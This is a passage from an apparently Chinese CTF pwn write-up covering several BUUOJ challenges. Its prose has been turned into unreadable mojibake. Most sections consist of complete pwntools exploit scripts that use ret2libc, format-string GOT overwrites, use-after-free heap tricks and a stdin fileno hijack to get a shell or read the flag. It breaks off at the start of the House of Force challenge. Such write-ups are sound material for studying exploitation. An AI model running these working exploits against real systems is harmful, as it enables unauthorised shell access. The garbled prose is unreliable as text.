<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26263</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./oneshot_tjctf_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Value: &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base + <span class="number">0x45216</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/9sbkfI16jzON7o3.png" alt="image.png"></p>
<h2 id="0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack"><a href="#0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack" class="headerlink" title="0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack"></a>0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/16/uvqV1ohgMNtDwJU.png" alt="image.png"></p>
<p>å¼€äº†sandboxï¼Œæ²¡æ³•æ‹¿ shell</p>
<p><img src="https://i.loli.net/2021/04/16/TymlVnQUjzaWAPd.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨ä¸€å¼€å§‹æ—¶æ‰“å¼€äº†flagæ–‡ä»¶ï¼Œå…¶æ–‡ä»¶æè¿°ç¬¦çš„æ ‡å·æ˜¯666</p>
<p><img src="https://i.loli.net/2021/04/16/mDfcZyVlBIYJtWa.png" alt="image.png"></p>
<p>æ•´ä¸ªç¨‹åºå¤§æ¦‚æ˜¯æœ‰åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/04/08/uYBepCstIJyR2Pq.png" alt="image.png"></p>
<p>å¤§æ¦‚æ˜¯èƒ½å¤Ÿåˆ†é…ä¸¤ç§å¤§å°çš„ chunk</p>
<p><img src="https://i.loli.net/2021/04/16/LS92KCXAhH1T643.png" alt="image.png"></p>
<p>ä»¥åŠä¸€ä¸ªè£¸çš„UAF</p>
<p><img src="https://i.loli.net/2021/04/16/HQ2RAbDe7xwrqap.png" alt="image.png"></p>
<p>é™åˆ¶äº†åªèƒ½æ‰“å°ä¸‰æ¬¡</p>
<p><img src="https://i.loli.net/2021/04/16/yW3FPNKwVzERGvD.png" alt="image.png"></p>
<p>åœ¨byebyeå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥è¿›è¡Œè¾“å…¥ï¼Œéšåç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ç»™è¾“å‡ºå‡ºæ¥</p>
<p><img src="https://i.loli.net/2021/04/16/lRJzUDxgPEdmAw5.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œè‹¥æ˜¯å°† <code>stdin</code> çš„ <code>_fileno</code> åŸŸæ”¹ä¸º <code>666</code>ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ä¾¿ä¼šä»flagæ–‡ä»¶ä¸­è¯»å–ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½å¾—åˆ°flag</p>
<p>ç¬”è€…è¿™é‡Œçš„åšæ³•å¤§æ¦‚æ˜¯å…ˆç”¨ double free æ³„æ¼å‡ºå †ä¸Šåœ°å€ä½ 2 å­—èŠ‚ï¼Œéšå double free æ”¹ä¸€ä¸ª chunk çš„ size ä¸º 0x91ï¼Œå¤šæ¬¡ alloc å¦ä¸€ç§ chunk å free è¯¥ chunk é€å…¥ unsorted bin æ³„éœ² libc ä½ 4 å­—èŠ‚ï¼Œéšåå† double free æ³„æ¼å‡ºå †ä¸Šåœ°å€ä½ 4 å­—èŠ‚å double free æ”¹å…¶æŒ‡å‘å †ä¸Šç‰¹å®š chunk ï¼Œæœ€åé€šè¿‡å †ä¸Šæ®‹ç•™æŒ‡é’ˆå†™åˆ° stdin çš„ fileno åŸŸ</p>
<p>ä»¥åŠæœ‰ç¬¦å·æ— ç¬¦å·ä»€ä¹ˆçš„ç¬”è€…å®åœ¨æ˜¯ä¸æƒ³è½¬æ¢äº†ï¼ˆç¬‘ï¼‰ï¼Œç›´æ¥å¤šæ¬¡å°è¯•è·å–éƒ½æ˜¯æ­£æ•°çš„å€¼å†è¡Œä¸‹ä¸€æ­¥</p>
<p>æ•…expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;which command?\n&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span>, content:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your inode number:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">type</span>:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;inode number :&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap_low_2_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> heap_low_2_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(heap_low_2_bytes))</span><br><span class="line">    new(<span class="number">2</span>, heap_low_2_bytes - <span class="number">0xa0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    main_arena_low_4_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>) - <span class="number">96</span></span><br><span class="line">    <span class="keyword">if</span> main_arena_low_4_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(main_arena_low_4_bytes - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">    main_arena_low_2_bytes = main_arena_low_4_bytes &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">if</span> (main_arena_low_2_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">1</span>, main_arena_low_4_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, main_arena_low_2_bytes - <span class="number">0x10</span> + <span class="number">14</span> * <span class="number">0x8</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    heap_low_4_bytes = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> heap_low_4_bytes &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line">    log.info(<span class="built_in">hex</span>(heap_low_4_bytes))</span><br><span class="line">    new(<span class="number">1</span>, heap_low_4_bytes + <span class="number">0x30</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;time no.&#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">            <span class="comment">#p = process(&#x27;./ciscn_final_2&#x27;, env =&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28664</span>)</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/05/03/ylEfUKbe9jJHC2k.png" alt="image.png"></p>
<h2 id="0x05B-x-ctf-b0verfl0w-ret2libc"><a href="#0x05B-x-ctf-b0verfl0w-ret2libc" class="headerlink" title="0x05B.x_ctf_b0verfl0w - ret2libc"></a>0x05B.x_ctf_b0verfl0w - ret2libc</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œ ä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2021/05/03/S6TUau94K2shjEX.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/03/HBnPAjhUlRJOsSW.png" alt="image.png"></p>
<p>å¥—æ¨¡æ¿ ret2libc</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29339</span>)<span class="comment">#process(&#x27;./b0verfl0w&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/Xf9HZkepCuSdxJY.png" alt="image.png"></p>
<h2 id="0x05C-cmcc-pwnme1-ret2libc"><a href="#0x05C-cmcc-pwnme1-ret2libc" class="headerlink" title="0x05C.cmcc_pwnme1 - ret2libc"></a>0x05C.cmcc_pwnme1 - ret2libc</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œ ä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2021/05/03/c1UHpa5tNi2qkZr.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/03/Ny92U1QTZ8CfJhE.png" alt="image.png"></p>
<p>å¥—æ¨¡æ¿ ret2libc</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26176</span>)<span class="comment">#process(&#x27;./pwnme1&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xA4</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;...\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/YQxpwzavBcD6TMi.png" alt="image.png"></p>
<h2 id="0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack"><a href="#0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack" class="headerlink" title="0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack"></a>0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/05/03/nlzWTmO3Au67cS8.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ä¸é™æ¬¡æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</p>
<p><img src="https://i.loli.net/2021/05/03/kmKzTDrQPxoIR6N.png" alt="image.png"></p>
<p>æ ¼å¼å­—ç¬¦ä¸²æ˜¯æ ˆä¸Šç¬¬ 6 ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/05/03/2ahxgk5POfdzQNB.png" alt="image.png"></p>
<p>gotè¡¨æ³„éœ² libc åŸºå€ æ”¹ got è¡¨ä¸€å¥—å¸¦èµ°</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p_name = <span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29449</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%7$s&#x27;</span> + p32(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">6</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>]:sys_addr&#125;))</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/NXiHAMaTu7YbF62.png" alt="image.png"></p>
<h2 id="0x05E-inndy-echo-fmtstr-got-hijack"><a href="#0x05E-inndy-echo-fmtstr-got-hijack" class="headerlink" title="0x05E.inndy_echo - fmtstr + got hijack"></a>0x05E.inndy_echo - fmtstr + got hijack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/05/03/kLsH2aCt8pEXDve.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ä¸é™æ¬¡æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</p>
<p><img src="https://i.loli.net/2021/05/03/5US6TDnZHWAxG9i.png" alt="image.png"></p>
<p>æ ¼å¼å­—ç¬¦ä¸²æ˜¯æ ˆä¸Šç¬¬ 7 ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/05/03/rCBf1ybjzM2h5xW.png" alt="image.png"></p>
<p>gotè¡¨æ³„éœ² libc åŸºå€ æ”¹ got è¡¨ä¸€å¥—å¸¦èµ°</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p_name = <span class="string">&#x27;./echo&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29718</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%8$s&#x27;</span> + p32(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>]:sys_addr&#125;))</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/4QcMXLA2zTpGxqe.png" alt="image.png"></p>
<blockquote>
<p>è¿™å’Œä¸Šä¸€é¢˜ä¸æ˜¯ä¸€æ¨¡ä¸€æ ·ğŸ¦„ï¼ˆæ¼</p>
</blockquote>
<h2 id="0x05F-gyctf-2020-force-House-of-Force"><a href="#0x05F-gyctf-2020-force-House-of-Force" class="headerlink" title="0x05F.gyctf_2020_force - House of Force"></a>0x05F.gyctf_2020_force - House of Force</h2><p>æƒ¯ä¾‹çš„ <code>checksc</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/03/T4nS6jVxFpBUI3J.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
